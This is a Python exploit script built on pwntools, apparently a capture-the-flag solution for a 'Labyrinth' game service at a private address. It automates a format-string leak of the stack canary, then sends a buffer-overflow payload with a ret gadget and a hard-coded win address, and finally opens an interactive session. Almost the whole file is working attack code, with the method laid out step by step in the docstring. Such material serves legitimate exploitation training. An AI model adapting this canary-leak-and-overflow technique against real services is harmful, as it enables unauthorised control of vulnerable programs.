# -*- coding: utf-8 -*-

"""
Labyrinth Game Remote Exploit (using pwntools)
This script bypasses both stack canary and buffer overflow vulnerabilities
to gain control of the program's execution flow.

This version has been upgraded to use the 'pwntools' library for more
reliable and cleaner network interaction.

---
Vulnerability Analysis:

1.  Format String Vulnerability: The `inscribe` function uses `printf(s)`,
    allowing an attacker to read from the stack using format specifiers like `%p`.
2.  Buffer Overflow Vulnerability: The `open_gate` function uses `gets(s1)`,
    allowing an attacker to overwrite the return address on the stack.

---
Exploitation Strategy (4-Stage Automated Attack):

1.  Find Canary Offset: The script probes the stack to find the correct offset
    of the stack canary by looking for the canary -> RBP -> return_address pattern.

2.  Leak the Stack Canary: Once the correct offset is found, the script uses it
    to leak the precise canary value from the stack.

3.  Fix Stack Alignment: To prevent a crash from a misaligned stack, we use a
    simple "ret" gadget. This one-instruction detour realigns the stack before
    the final jump to our target.

4.  Bypass Protections: Finally, it constructs the buffer overflow payload,
    inserting the correct canary and the ret gadget. This bypasses all protections
    and allows our overwritten return address to be executed.

Payload Structure:
[ 72 bytes junk ] + [ 8 bytes LEAKED CANARY ] + [ 8 bytes RBP ] + [ 8 bytes RET GADGET ] + [ 8 bytes WIN ADDRESS ]

"""

from pwn import * # Import the pwntools library

def find_canary_offset(p):
    """
    Automates finding the correct canary offset by looking for the
    canary -> saved_rbp -> return_addr pattern on the stack.
    """
    log.info("Searching for canary offset using pattern matching...")
    # We start the search at a higher offset to avoid irrelevant data.
    for i in range(6, 31):
        p.recvuntil(b'> ')
        p.sendline(b'inscribe')
        p.recvuntil(b'>> ')
        # Leak three consecutive 64-bit values from the stack
        payload = f'%{i}$p.%{i+1}$p.%{i+2}$p'.encode()
        p.sendline(payload)
        p.recvuntil(b'bertuliskan: ')
        leaked_line = p.recvline().strip()

        try:
            parts = leaked_line.split(b'.')
            if len(parts) != 3:
                continue

            potential_canary = parts[0]
            # The return address is the third value in our pattern
            potential_ret_addr = parts[2]

            # Condition 1: Is the first value a valid canary? (ends in '00')
            is_canary = potential_canary.startswith(b'0x') and potential_canary.endswith(b'00')

            # Condition 2: Is the third value a valid return address?
            # (points to the .text section, usually starting with 0x40...)
            is_ret_addr = potential_ret_addr.startswith(b'0x40')

            if is_canary and is_ret_addr:
                log.success(f"Canary pattern found at offset {i}!")
                log.info(f"Leaked values: {leaked_line.decode()}")
                return i
        except (ValueError, IndexError):
            # Ignore lines that don't parse correctly
            continue

    log.failure("Could not find canary offset automatically.")
    return None

def leak_canary(p, offset):
    """
    Uses the format string vulnerability in 'inscribe' to leak the stack canary
    at a specific, confirmed offset.
    """
    log.info(f"Attempting to leak stack canary at offset {offset}...")
    format_string_payload = f'%{offset}$p'.encode()

    p.recvuntil(b'> ')
    p.sendline(b'inscribe')
    p.recvuntil(b'>> ')
    p.sendline(format_string_payload)

    # Receive the line containing the leak
    p.recvuntil(b'bertuliskan: ')
    leaked_line = p.recvline().strip()

    # The leaked value is a hex string like "0x...", convert it to an integer
    leaked_canary = int(leaked_line, 16)
    log.success(f"Leaked Canary: {hex(leaked_canary)}")

    return leaked_canary


def generate_exploit_payload(canary):
    """
    Generates the final buffer overflow payload using the leaked canary.
    """
    log.info("Generating final exploit payload...")

    # 1. Padding to fill the buffer `s1` (72 bytes)
    padding = b"A" * 72
    log.info(f"Creating padding for the buffer: {len(padding)} bytes")

    # 2. The Leaked Canary
    packed_canary = p64(canary)

    # 3. Padding for the saved base pointer (rbp)
    overwrite_rbp = b"B" * 8
    log.info(f"Creating padding for RBP: {len(overwrite_rbp)} bytes")
    
    # 4. The RET Gadget for Stack Alignment
    # This address is for a single `ret` instruction. It helps align the stack
    # before jumping to the win function, preventing a crash.
    # You can find one using: ROPgadget --binary labyrinth | grep " : ret"
    # A common address for simple binaries is 0x40101a.
    ret_gadget = 0x40101a
    log.info(f"Using RET gadget for stack alignment: {hex(ret_gadget)}")

    # 5. The Target Return Address
    # From objdump, this is the address of `puts("Gerbang terbuka! ...")`
    win_address = 0x401337
    log.success(f"Target 'win' address: {hex(win_address)}")

    # 6. Assemble the final payload
    payload = padding + packed_canary + overwrite_rbp + p64(ret_gadget) + p64(win_address)
    log.info(f"Final payload length: {len(payload)} bytes")

    return payload

def run_remote_exploit():
    """
    Connects to the remote game server, finds the canary, leaks it, and sends the exploit.
    """
    host = '10.1.2.228'
    port = 1338

    p = remote(host, port)

    # STAGE 1: Find the correct canary offset automatically
    offset = find_canary_offset(p)
    if offset is None:
        p.close()
        return

    # STAGE 2: Leak the canary using the found offset
    canary = leak_canary(p, offset)

    # STAGE 3: Generate and send the final payload
    payload = generate_exploit_payload(canary)

    # We are now back at the main prompt, proceed to the 'open' command
    p.recvuntil(b'> ')
    p.sendline(b'open')

    # Receive until the password prompt
    p.recvuntil(b'sandi: ')

    # Send the final exploit payload
    log.info("Sending final exploit payload...")
    p.sendline(payload)

    # Hand over control to the user to see the output (e.g., the flag)
    log.success("Exploit sent! Handing over to interactive shell...")
    p.interactive()


if __name__ == "__main__":
    run_remote_exploit()
